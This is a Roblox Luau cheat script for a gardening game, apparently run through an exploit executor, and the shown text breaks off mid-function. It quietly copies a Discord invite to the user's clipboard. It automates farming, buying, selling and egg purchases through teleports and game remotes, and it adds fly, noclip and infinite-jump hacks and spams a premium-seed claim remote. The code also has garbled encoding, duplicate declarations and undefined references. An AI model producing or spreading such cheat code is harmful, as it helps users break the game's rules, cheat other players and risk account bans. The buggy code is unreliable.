setclipboard("https://discord.gg/dmBzVaRrD3")
-- Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local InsertService = game:GetService("InsertService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local cam = workspace.CurrentCamera
local mouse = game.Players.LocalPlayer:GetMouse()

-- Player and Character
local lp = Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local oldCFrame = hrp.CFrame
local leaderstats = lp:FindFirstChild("leaderstats")
local shecklesStat = leaderstats and leaderstats:FindFirstChild("Sheckles")
local RS, Players = game:GetService("ReplicatedStorage"), game:GetService("Players")
local PetName, PetWeight, PetAge = "", "", ""

local function makeInput(Tab, name, placeholder, callback)
    Tab:CreateInput({
        Name = name,
        PlaceholderText = placeholder,
        RemoveTextAfterFocusLost = false,
        Callback = callback,
    })
end

-- Remotes and Paths
local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
local seedRemote = GameEvents:WaitForChild("BuySeedStock")
local gearRemote = GameEvents:WaitForChild("BuyGearStock")
local honeyRemote = GameEvents:WaitForChild("BuyEventShopStock")
local easterRemote = GameEvents:WaitForChild("BuyEasterStock")
local plantRemote = GameEvents:WaitForChild("Plant_RE")
local favoriteEvent = GameEvents:WaitForChild("Favorite_Item")
local seedPath = lp.PlayerGui.Seed_Shop.Frame.ScrollingFrame
local gearPath = lp.PlayerGui.Gear_Shop.Frame.ScrollingFrame
local bmPath = lp.PlayerGui.EventShop_UI.Frame.ScrollingFrame

-- Constants
local ProductId = 3268187638
local CLICK_DELAY = 0.00000001
local MAX_DISTANCE = 50
local RANGE = 50
local flySpeed = 48

-- Item Lists
local seedItems = {"Carrot", "Strawberry", "Tomato", "Cauliflower", "Watermelon", "Green Apple", "Avocado", "Banana", "Pineapple", "Kiwi", "Bell Pepper", "Prickly Pear", "Loquat", "Feijoa", "Sugar Apple"}

local gearItems = {"Watering Can", "Trowel", "Recall Wrench", "Basic Sprinkler", "Advanced Sprinkler", "Godly Sprinkler", "Lightning Rod", "Tanning Mirror", "Master Sprinkler", "Cleaning Spray", "Favorite Tool", "Harvest Tool", "Friendship Pot"}

local honeyItems = {"Hive Fruit", "Honey Sprinkler", "Bee Egg", "Nectarine", "Bee Crate", "Honey Walkway", "Honey Torch", "Bee Chair", "Honey Comb", "Flower Seed Pack", "Lavender", "Nectarshade", "Pollen Radar", "Nectar Staff"}

local mutationOptions = {"Ripe", "Wet", "Gold", "Frozen", "Rainbow", "Choc", "Chilled", "Shocked", "Moonlit", "Bloodlit", "Celestial", "Plasma", "Disco", "Cooked", "Zombified", "Voidtouched", "Pollinated", "HoneyGlazed", "Twisted", "Heavenly", "Molten", "Burnt", "Dawnbound", "Meteoric", "Beanaded", "Alienlike", "Galactic", "Windstruck", "Meteoric"}

local seedNames = {"Apple", "Banana", "Bamboo", "Blueberry", "Beanstalk", "Candy Blossom", "Candy Sunflower", "Carrot", "Cactus", "Chocolate Carrot", "Cacao", "Coconut", "Corn", "Cranberry", "Cucumber", "Cursed Fruit", "Daffodil", "Dragon Fruit", "Durian", "Eggplant", "Ember Lily", "Grape", "Lemon", "Lilac", "Lotus", "Mango", "Mushroom", "Nectarshade", "Nectarine", "Pepper", "Orange Tulip", "Papaya", "Passionfruit", "Peach", "Pear", "Pineapple", "Pumpkin", "Purple Dahlia", "Pink Lily", "Raspberry", "Rose", "Red Lollipop", "Sunflower", "Sugar Apple", "Soul Fruit", "Strawberry", "Tomato", "Venus Fly Trap", "Watermelon"}

-- State Variables
local autoBuyEnabled = false
local autoBuyEnabledE = false
local autoFarmEnabled = false
local fastClickEnabled = false
local autoSellEnabled = false
local HarvestEnabled = false
local autoFarmPollinatedEnabled = false
local flyEnabled = false
local noclip = false
local infJump = false
local spamE = false
local enabled = false
local BAnanaDupeE = false
local autoFavoriteEnabled = false
local autoClaimToggle = false
local autoSkipEnabled = false
local AutoPlanting = false
local CurrentlyPlanting = false
local AaA = false
local EasterShopBuyEnabled = false
local Autoegg_autoBuyEnabled = false
local Autoegg_firstRun = true
local selectedSeeds = {"Beanstalk", "Pepper", "Cacao", "Ember Lily"}
local SelectedSeeds = {"Beanstalk", "Pepper", "Cacao", "Ember Lily"}
local selectedGears = {"Master Sprinkler", "Godly Sprinkler", "Harvest Tool"}
local selectedHoney = {"Hive Fruit", "Bee Egg", "Honey Sprinkler", "Nectarine"}
local EasterShopSelectedItems = {}, {}, {}, {}, EasterShopItems
local selectedMutations = {"Gold", "Frozen", "Rainbow", "Choc", "Chilled", "Shocked", "Moonlit", "Bloodlit", "Celestial", "Zombified", "Pollinated", "Voidtouched", "Molten", "Burnt"}
local state = {
    selectedMutations = {"Bloodlit", "Celestial", "Disco", "Zombified", "Plasma", "Pollinated", "Voidtouched", "Heavenly"},
    espEnabled = false,
    espBillboards = {},
    espHighlights = {},
    webhookUrl = ""
}
local mutationColors = {
    Wet = Color3.fromRGB(0, 0, 255),
    Gold = Color3.fromRGB(255, 215, 0),
    Frozen = Color3.fromRGB(135, 206, 250),
    Rainbow = Color3.fromRGB(255, 255, 255),
    Choc = Color3.fromRGB(139, 69, 19),
    Chilled = Color3.fromRGB(0, 255, 255),
    Shocked = Color3.fromRGB(255, 255, 100),
    Moonlit = Color3.fromRGB(128, 0, 128),
    Bloodlit = Color3.fromRGB(200, 0, 0),
    Celestial = Color3.fromRGB(200, 150, 255),
    Zombified = Color3.fromRGB(100, 200, 100),
    Pollinated = Color3.fromRGB(255, 215, 0),
    Voidtouched = Color3.fromRGB(30, 0, 50)
}

-- Runtime Variables
local farms = {}
local plants = {}
local farmThread, fastClickThread, autoSellThread, HarvestConnection, flightConnection, collectionThread, descendantConnection, connection, claimConnection, BananaDupe
local farmPollinatedThread
local bodyVelocity, bodyGyro
local promptTracker = {}
local notifiedFruits = {}
local autoFarmEnabled = false
local fastClickEnabled = false
local harvestEnabled = false
local farmThread, fastClickThread, harvestThread
local MAX_DISTANCE = 50
local CLICK_DELAY = 0.1
local TELEPORT_HEIGHT = 5
local HARVEST_DELAY = 0.2

lp.PlayerGui.Hud_UI.SideBtns.Spin.Visible = true
lp.PlayerGui.Hud_UI.SideBtns.StarterPack.Visible = true
lp.PlayerGui.Teleport_UI.Frame.Pets.Visible = true
local gearicon = lp.PlayerGui.Teleport_UI.Frame.Gear
gearicon.Visible = true
gearicon.ImageColor3 = Color3.fromRGB(255, 255, 255)

-- Utility Functions
local function parseMoney(moneyStr)
    if not moneyStr then return 0 end
    moneyStr = tostring(moneyStr):gsub("ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢", ""):gsub(",", ""):gsub(" ", ""):gsub("%$", "")
    local multiplier = 1
    if moneyStr:lower():find("k") then
        multiplier = 1000
        moneyStr = moneyStr:lower():gsub("k", "")
    elseif moneyStr:lower():find("m") then
        multiplier = 1000000
        moneyStr = moneyStr:lower():gsub("m", "")
    end
    return (tonumber(moneyStr) or 0) * multiplier
end

local function getPlayerMoney()
    return parseMoney((shecklesStat and shecklesStat.Value) or 0)
end

local function isInventoryFull()
    return #lp.Backpack:GetChildren() >= 200
end

-- Auto Farm Functions
local function updateFarmData()
    farms = {}
    plants = {}
    for _, farm in pairs(workspace:FindFirstChild("Farm"):GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
            local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
            if plantsFolder then
                for _, plantModel in pairs(plantsFolder:GetChildren()) do
                    for _, part in pairs(plantModel:GetDescendants()) do
                        if part:IsA("BasePart") and part:FindFirstChildOfClass("ProximityPrompt") then
                            table.insert(plants, part)
                            break
                        end
                    end
                end
            end
        end
    end
end

local function glitchTeleport(pos)
    if not lp.Character then return end
    local root = lp.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local tween = TweenService:Create(root, TweenInfo.new(0.15, Enum.EasingStyle.Linear), {CFrame=CFrame.new(pos + Vector3.new(0, 5, 0))})
    tween:Play()
end

local function instantFarm()
    if farmThread then task.cancel(farmThread) end
    farmThread = task.spawn(function()
        while autoFarmEnabled do
            while isInventoryFull() do
                if not autoFarmEnabled then return end
                task.wait(1)
            end
            if not autoFarmEnabled then return end
            updateFarmData()
            for _, part in pairs(plants) do
                if not autoFarmEnabled then return end
                if isInventoryFull() then break end
                if part and part.Parent then
                    local prompt = part:FindFirstChildOfClass("ProximityPrompt")
                    if prompt then
                        glitchTeleport(part.Position)
                        task.wait(0.2)
                        for _, farm in pairs(farms) do
                            if not autoFarmEnabled or isInventoryFull() then break end
                            for _, obj in pairs(farm:GetDescendants()) do
                                if obj:IsA("ProximityPrompt") then
                                    local str = tostring(obj.Parent)
                                    if not (str:find("Grow_Sign") or str:find("Core_Part")) then
                                        fireproximityprompt(obj, 1)
                                    end
                                end
                            end
                        end
                        if not autoFarmEnabled then return end
                        task.wait(0.2)
                    end
                end
            end
            if autoFarmEnabled then task.wait(0.1) end
        end
    end)
end

local function instantFarmPollinated()
    if farmThread then task.cancel(farmThread) end
    farmThread = task.spawn(function()
        while autoFarmEnabled do
            while isInventoryFull() do
                if not autoFarmEnabled then return end
                task.wait(1)
            end
            if not autoFarmEnabled then return end
            updateFarmData()
            for _, part in pairs(plants) do
                if not autoFarmEnabled then return end
                if isInventoryFull() then break end
                if part and part.Parent then
                    local model = part:FindFirstAncestorOfClass("Model")
                    if model and model:GetAttribute("Pollinated") == true then
                        local prompt = part:FindFirstChildOfClass("ProximityPrompt")
                        if prompt then
                            glitchTeleport(part.Position)
                            task.wait(0.2)
                            for _, farm in pairs(farms) do
                                if not autoFarmEnabled or isInventoryFull() then break end
                                for _, obj in pairs(farm:GetDescendants()) do
                                    if obj:IsA("ProximityPrompt") then
                                        local str = tostring(obj.Parent)
                                        if not (str:find("Grow_Sign") or str:find("Core_Part")) then
                                            local objModel = obj.Parent:FindFirstAncestorOfClass("Model")
                                            if objModel and objModel:GetAttribute("Pollinated") == true then
                                                fireproximityprompt(obj, 1)
                                            end
                                        end
                                    end
                                end
                            end
                            if not autoFarmEnabled then return end
                            task.wait(0.2)
                        end
                    end
                end
            end
            if autoFarmEnabled then task.wait(0.1) end
        end
    end)
end

local function getOwnedFarms()
    local ownedFarms = {}
    for _, farm in ipairs(FarmFolder:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(ownedFarms, farm)
        end
    end
    return ownedFarms
end

-- Optimized teleport function with checks
local function safeTeleport(position)
    if not lp.Character then return false end
    local root = lp.Character:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    
    local success, err = pcall(function()
        local tween = TweenService:Create(
            root, 
            TweenInfo.new(0.15, Enum.EasingStyle.Linear), 
            {CFrame = CFrame.new(position + Vector3.new(0, TELEPORT_HEIGHT, 0))}
        )
        tween:Play()
    end)
    
    return success
end

-- Improved plant validation
local function isValidPlant(plantModel)
    if not plantModel:IsA("Model") then return false end
    return plantModel:GetAttribute("Pollinated") == true
end

-- Optimized prompt validation
local function isValidPrompt1(prompt)
    if not prompt:IsA("ProximityPrompt") then return false end
    local parent = prompt.Parent
    if not parent or not parent:IsA("BasePart") then return false end
    
    local model = parent.Parent
    if not isValidPlant(model) then return false end
    
    local name = parent.Name:lower()
    return not (name:find("sign") or name:find("core"))
end

local function getNearbyPrompts1()
    local nearby = {}
    local character = lp.Character
    if not character then return nearby end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nearby end
    
    for _, farm in ipairs(getOwnedFarms()) do
        for _, descendant in ipairs(farm:GetDescendants()) do
            if isValidPrompt(descendant) then
                local part = descendant.Parent
                if (hrp.Position - part.Position).Magnitude <= MAX_DISTANCE then
                    table.insert(nearby, descendant)
                end
            end
        end
    end
    
    return nearby
end

local function runAutoFarm()
    while autoFarmEnabled and task.wait() do
        if isInventoryFull() then
            task.wait(1)
            continue
        end
        
        local prompts = getNearbyPrompts()
        for _, prompt in ipairs(prompts) do
            if not autoFarmEnabled or isInventoryFull() then break end
            
            local part = prompt.Parent
            if part and part.Parent then
                safeTeleport(part.Position)
                task.wait(0.2)
                fireproximityprompt(prompt, 1)
                task.wait(CLICK_DELAY)
            end
        end
    end
end

-- Auto Collect Functions
local function isValidPrompt(prompt)
    local parent = prompt.Parent
    if not parent then return false end
    local name = parent.Name:lower()
    return not (name:find("sign") or name:find("core"))
end

local function getNearbyPrompts()
    local nearby = {}
    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nearby end
    
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            for _, obj in pairs(farm:GetDescendants()) do
                if obj:IsA("ProximityPrompt") and isValidPrompt(obj) then
                    local part = obj.Parent
                    if part:IsA("BasePart") then
                        local dist = (hrp.Position - part.Position).Magnitude
                        if dist <= MAX_DISTANCE then
                            table.insert(nearby, obj)
                        end
                    end
                end
            end
        end
    end
    return nearby
end

local function getNearbyHoney()
    local nearby = {}
    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nearby end
    
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            for _, obj in pairs(farm:GetDescendants()) do
                if obj:IsA("ProximityPrompt") and isValidPrompt(obj) then
                    local part = obj.Parent
                    if part:IsA("BasePart") then
                        -- Check if the BasePart's parent Model has Pollinated = true
                        local model = part.Parent
                        if model and model:IsA("Model") and model:GetAttribute("Pollinated") == true then
                            local dist = (hrp.Position - part.Position).Magnitude
                            if dist <= MAX_DISTANCE then
                                table.insert(nearby, obj)
                            end
                        end
                    end
                end
            end
        end
    end
    return nearby
end

local function fastClickFarm()
    if fastClickThread then task.cancel(fastClickThread) end
    fastClickThread = task.spawn(function()
        while fastClickEnabled do
            if isInventoryFull() then
                task.wait(1)
                continue
            end
            local prompts = getNearbyPrompts()
            for _, prompt in pairs(prompts) do
                if not fastClickEnabled then return end
                if isInventoryFull() then break end
                fireproximityprompt(prompt, 1)
                task.wait(CLICK_DELAY)
            end
            task.wait(0.1)
        end
    end)
end

local function RunFastClick()
    if fastClickThread then task.cancel(fastClickThread) end
    fastClickThread = task.spawn(function()
        while fastClickEnabled do
            if isInventoryFull() then
                task.wait(1)
                continue
            end
            local prompts = getNearbyHoney()
            for _, prompt in pairs(prompts) do
                if not fastClickEnabled then return end
                if isInventoryFull() then break end
                fireproximityprompt(prompt, 1)
                task.wait(CLICK_DELAY)
            end
            task.wait(0.1)
        end
    end)
end

-- Auto Sell Functions
local function sellItems()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if not steven then return false end
    
    local char = lp.Character
    if not char then return false end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local originalPosition = hrp.CFrame
    hrp.CFrame = steven.HumanoidRootPart.CFrame * CFrame.new(0, 3, 3)
    task.wait(0.5)
    
    for _ = 1, 5 do
        pcall(function()
            ReplicatedStorage.GameEvents.Sell_Inventory:FireServer()
        end)
        task.wait(0.15)
    end
    
    hrp.CFrame = originalPosition
    return true
end

-- Harvest Functions
local function FindGarden()
    local farm = workspace:FindFirstChild("Farm")
    if not farm then return nil end
    
    for _, plot in ipairs(farm:GetChildren()) do
        local data = plot:FindFirstChild("Important") and plot.Important:FindFirstChild("Data")
        local owner = data and data:FindFirstChild("Owner")
        if owner and owner.Value == lp.Name then
            return plot
        end
    end
    return nil
end

local function CanHarvest(part)
    local prompt = part:FindFirstChild("ProximityPrompt")
    return prompt and prompt.Enabled
end

local function Harvest()
    if not HarvestEnabled then return end
    if isInventoryFull() then return end
    
    local garden = FindGarden()
    if not garden then return end
    
    local plants = garden:FindFirstChild("Important") and garden.Important:FindFirstChild("Plants_Physical")
    if not plants then return end
    
    for _, plant in ipairs(plants:GetChildren()) do
        if not HarvestEnabled then break end
        local fruits = plant:FindFirstChild("Fruits")
        if fruits then
            for _, fruit in ipairs(fruits:GetChildren()) do
                if not HarvestEnabled then break end
                for _, part in ipairs(fruit:GetChildren()) do
                    if not HarvestEnabled then break end
                    if part:IsA("BasePart") and CanHarvest(part) then
                        local prompt = part.ProximityPrompt
                        local pos = part.Position + Vector3.new(0, 3, 0)
                        if lp.Character and lp.Character.PrimaryPart then
                            lp.Character:SetPrimaryPartCFrame(CFrame.new(pos))
                            task.wait(0.1)
                            if not HarvestEnabled then break end
                            prompt:InputHoldBegin()
                            task.wait(0.1)
                            if not HarvestEnabled then break end
                            prompt:InputHoldEnd()
                            task.wait(0.1)
                        end
                    end
                end
            end
        end
    end
end

local function ToggleHarvest(state)
    if HarvestConnection then
        HarvestConnection:Disconnect()
        HarvestConnection = nil
    end
    HarvestEnabled = state
    if state then
        HarvestConnection = RunService.Heartbeat:Connect(function()
            if HarvestEnabled then
                Harvest()
            else
                HarvestConnection:Disconnect()
                HarvestConnection = nil
            end
        end)
    end
end

-- Movement Functions
local function Fly(state)
    flyEnabled = state
    if flyEnabled then
        local character = lp.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        
        bodyGyro = Instance.new("BodyGyro")
        bodyVelocity = Instance.new("BodyVelocity")
        bodyGyro.P = 9000
        bodyGyro.maxTorque = Vector3.new(8999999488, 8999999488, 8999999488)
        bodyGyro.cframe = character.HumanoidRootPart.CFrame
        bodyGyro.Parent = character.HumanoidRootPart
        
        bodyVelocity.velocity = Vector3.new(0, 0, 0)
        bodyVelocity.maxForce = Vector3.new(8999999488, 8999999488, 8999999488)
        bodyVelocity.Parent = character.HumanoidRootPart
        humanoid.PlatformStand = true
        
        flightConnection = RunService.Heartbeat:Connect(function()
            if not flyEnabled or not character:FindFirstChild("HumanoidRootPart") then
                if flightConnection then flightConnection:Disconnect() end
                return
            end
            
            local cam = workspace.CurrentCamera.CFrame
            local moveVec = Vector3.new()
            
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                moveVec = moveVec + cam.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                moveVec = moveVec - cam.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                moveVec = moveVec - cam.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                moveVec = moveVec + cam.RightVector
            end
            
            if moveVec.Magnitude > 0 then
                moveVec = moveVec.Unit * flySpeed
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                moveVec = moveVec + Vector3.new(0, flySpeed, 0)
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                moveVec = moveVec + Vector3.new(0, -flySpeed, 0)
            end
            
            bodyVelocity.velocity = moveVec
            bodyGyro.cframe = cam
        end)
    else
        if bodyVelocity then bodyVelocity:Destroy() end
        if bodyGyro then bodyGyro:Destroy() end
        
        local character = lp.Character
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.PlatformStand = false
            end
        end
        
        if flightConnection then
            flightConnection:Disconnect()
            flightConnection = nil
        end
    end
end

local function ToggleNoclip(state)
    noclip = state
end

RunService.Stepped:Connect(function()
    if noclip then
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide == true then
                part.CanCollide = false
            end
        end
    end
end)

local function ToggleInfJump(state)
    infJump = state
end

UserInputService.JumpRequest:Connect(function()
    if infJump and char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- Shop Functions
local function OpenShop()
    local shop = lp.PlayerGui.Seed_Shop
    shop.Enabled = not shop.Enabled
end

local function OpenGearShop()
    local gear = lp.PlayerGui.Gear_Shop
    gear.Enabled = not gear.Enabled
end

local function OpenEaster()
    local easter = lp.PlayerGui.Easter_Shop
    easter.Enabled = not easter.Enabled
end

local function OpenQuest()
    local quest = lp.PlayerGui.DailyQuests_UI
    quest.Enabled = not quest.Enabled
end

local function OpenHoney()
    local quest = lp.PlayerGui.HoneyEventShop_UI
    quest.Enabled = not quest.Enabled
end

local function OpenCosmetic()
    local Bs = lp.PlayerGui.CosmeticShop_UI
    Bs.Enabled = not Bs.Enabled
end

local function EggShop1()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations["Common Egg"].ProximityPrompt)
end

local function EggShop2()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations:GetChildren()[6].ProximityPrompt)
end

local function EggShop3()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations:GetChildren()[5].ProximityPrompt)
end

-- Auto Buy Egg
local Autoegg_npc = workspace:WaitForChild("NPCS"):WaitForChild("Pet Stand")
local Autoegg_timer = Autoegg_npc.Timer.SurfaceGui:WaitForChild("ResetTimeLabel")
local Autoegg_eggLocations = Autoegg_npc:WaitForChild("EggLocations")
local Autoegg_events = GameEvents

local function Autoegg_safeFirePrompt(prompt)
    if prompt then
        pcall(function()
            fireproximityprompt(prompt)
        end)
    end
end

local function Autoegg_safeFireServer(id)
    pcall(function()
        Autoegg_events:WaitForChild("BuyPetEgg"):FireServer(id)
    end)
end

local function Autoegg_setAlwaysShow()
    for _, obj in ipairs(Autoegg_eggLocations:GetChildren()) do
        for _, child in ipairs(obj:GetDescendants()) do
            if child:IsA("ProximityPrompt") then
                child.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
            end
        end
    end
end

local function Autoegg_autoBuyEggs()
    if Autoegg_autoBuyEnabled then
        if not Autoegg_firstRun then
            while Autoegg_timer.Text ~= "00:00:00" do
                task.wait(0.1)
            end
            task.wait(3)
        else
            Autoegg_firstRun = false
        end

        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
        lp.Character.HumanoidRootPart.CFrame = CFrame.new(-255.12291, 2.99999976, -1.13749218, -0.0163238496, 1.05261321e-07, 0.999866784, -5.92361182e-09, 1, -1.0537206e-07, -0.999866784, -7.64290053e-09, -0.0163238496)

        Autoegg_setAlwaysShow()

        local commonEggPrompt = Autoegg_eggLocations:FindFirstChild("Common Egg")
        if commonEggPrompt then
            Autoegg_safeFirePrompt(commonEggPrompt:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(1)
        end

        local eggSlot6 = Autoegg_eggLocations:GetChildren()[6]
        if eggSlot6 then
            Autoegg_safeFirePrompt(eggSlot6:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(2)
        end

        local eggSlot5 = Autoegg_eggLocations:GetChildren()[5]
        if eggSlot5 then
            Autoegg_safeFirePrompt(eggSlot5:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(3)
        end

        lp.Character.HumanoidRootPart.CFrame = oldCFrame
    end
end

task.spawn(function()
    while true do
        task.wait(0.5)
        if Autoegg_autoBuyEnabled then
            Autoegg_autoBuyEggs()
        end
    end
end)

-- Sell Functions
local function SellAll()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if steven then
        hrp.CFrame = steven.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.2)
        GameEvents:WaitForChild("Sell_Inventory"):FireServer()
        
        local farms = workspace:WaitForChild("Farm"):GetChildren()
        for _, farm in pairs(farms) do
            local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
            if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
                local spawn = farm:FindFirstChild("Spawn_Point")
                if spawn then
                    hrp.CFrame = spawn.CFrame + Vector3.new(0, 3, 0)
                    break
                end
            end
        end
    end
end

local function HSell()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if steven then
        hrp.CFrame = steven.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.2)
        GameEvents:WaitForChild("Sell_Item"):FireServer()
        
        local farms = workspace:WaitForChild("Farm"):GetChildren()
        for _, farm in pairs(farms) do
            local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
            if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
                local spawn = farm:FindFirstChild("Spawn_Point")
                if spawn then
                    hrp.CFrame = spawn.CFrame + Vector3.new(0, 3, 0)
                    break
                end
            end
        end
    end
end

-- Auto Collect V2 Functions
local function modifyPrompt(prompt, show)
    pcall(function()
        prompt.RequiresLineOfSight = not show
        prompt.Exclusivity = show and Enum.ProximityPromptExclusivity.AlwaysShow or Enum.ProximityPromptExclusivity.One
    end)
end

local function isInsideFarm(part)
    for _, farm in pairs(farms) do
        if part:IsDescendantOf(farm) then
            return true
        end
    end
    return false
end

local function handleNewPrompt(prompt)
    if not prompt:IsA("ProximityPrompt") then return end
    if not isInsideFarm(prompt) then return end
    
    if not promptTracker[prompt] then
        promptTracker[prompt] = {
            originalRequiresLOS = prompt.RequiresLineOfSight,
            originalExclusivity = prompt.Exclusivity
        }
    end
    
    modifyPrompt(prompt, spamE)
    prompt.AncestryChanged:Connect(function(_, parent)
        if parent == nil then
            promptTracker[prompt] = nil
        end
    end)
end

-- One Click Remove Functions
local function OneClickRemove(state)
    enabled = state
    local confirmFrame = lp.PlayerGui:FindFirstChild("ShovelPrompt")
    if confirmFrame and confirmFrame:FindFirstChild("ConfirmFrame") then
        confirmFrame.ConfirmFrame.Visible = not state
    end
end

-- Destroy Sign Function
local function DestroySign()
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local sign = farm:FindFirstChild("Sign")
        if sign then
            local core = sign:FindFirstChild("Core_Part")
            if core then
                for _, obj in pairs(core:GetDescendants()) do
                    if obj:IsA("ProximityPrompt") then
                        obj:Destroy()
                    end
                end
            end
        end
        
        local growSign = farm:FindFirstChild("Grow_Sign")
        if growSign then
            for _, obj in pairs(growSign:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    obj:Destroy()
                end
            end
        end
    end
end

-- Auto Favorite Functions
local function toolMatchesMutation(toolName)
    for _, mutation in ipairs(selectedMutations) do
        if string.find(toolName, mutation) then
            return true
        end
    end
    return false
end

local function isToolFavorited(tool)
    return tool:GetAttribute("Favorite") or (tool:FindFirstChild("Favorite") and tool.Favorite.Value)
end

local function favoriteToolIfMatches(tool)
    if toolMatchesMutation(tool.Name) and not isToolFavorited(tool) then
        favoriteEvent:FireServer(tool)
        task.wait(0.1)
    end
end

local function processBackpack()
    local backpack = lp:FindFirstChild("Backpack") or lp:WaitForChild("Backpack")
    for _, tool in ipairs(backpack:GetChildren()) do
        favoriteToolIfMatches(tool)
    end
end

local function setupAutoFavorite()
    if connection then connection:Disconnect() end
    local backpack = lp:WaitForChild("Backpack")
    connection = backpack.ChildAdded:Connect(function(tool)
        task.wait(0.1)
        favoriteToolIfMatches(tool)
    end)
    processBackpack()
end

-- Auto Claim Premium Seeds Functions
local function claimPremiumSeed()
    GameEvents.SeedPackGiverEvent:FireServer("ClaimPremiumPack")
end

local function toggleAutoClaim(newState)
    autoClaimToggle = newState
    if claimConnection then
        claimConnection:Disconnect()
        claimConnection = nil
    end
    if autoClaimToggle then
        claimConnection = RunService.Heartbeat:Connect(function()
            claimPremiumSeed()
            task.wait()
        end)
    end
end

-- Auto Open Crate Functions
local function toggleAutoSkip()
    autoSkipEnabled = not autoSkipEnabled
    if autoSkipEnabled then
        task.spawn(function()
            local character = lp.Character
            local backpack = lp:FindFirstChild("Backpack")
            local seedTool
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and tool.Name:find("Basic Seed Pack") then
                        seedTool = tool
                        break
                    end
                end
            end
            if seedTool and character then
                seedTool.Parent = character
            end
            
            while autoSkipEnabled do
                local PlayerGui = lp:FindFirstChild("PlayerGui")
                local RollCrate_UI = PlayerGui and PlayerGui:FindFirstChild("RollCrate_UI")
                local character = lp.Character
                local equippedTool = character and character:FindFirstChildOfClass("Tool")
                local holdingSeed = equippedTool and equippedTool.Name:find("Basic Seed Pack")
                
                if RollCrate_UI then
                    if RollCrate_UI.Enabled then
                        local Frame = RollCrate_UI:FindFirstChild("Frame")
                        local Button = Frame and Frame:FindFirstChild("Skip")
                        if Button and Button:IsA("ImageButton") and Button.Visible then
